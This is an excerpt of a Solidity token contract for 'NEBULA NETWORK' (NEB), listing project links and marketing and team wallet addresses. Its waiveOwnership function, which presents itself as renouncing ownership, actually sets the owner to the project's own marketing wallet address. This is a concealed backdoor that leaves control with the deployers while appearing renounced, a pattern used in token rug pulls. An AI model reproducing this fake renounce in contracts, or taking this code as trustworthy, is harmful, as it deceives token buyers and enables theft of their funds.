...
Telegram https://t.me/nebulanetwork
Website https://nebulanetwork.org
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x67c512a7300C2206e9bDC60F340F9e78B4a473DE);
    }
...
contract NebulaNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "NEBULA NETWORK";
    string private _symbol = "NEB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x67c512a7300C2206e9bDC60F340F9e78B4a473DE);
    address payable public teamWalletAddress = payable(0xA3d40Fdd9D68b2ACCEBbaf4370D29fe95f2F527D);
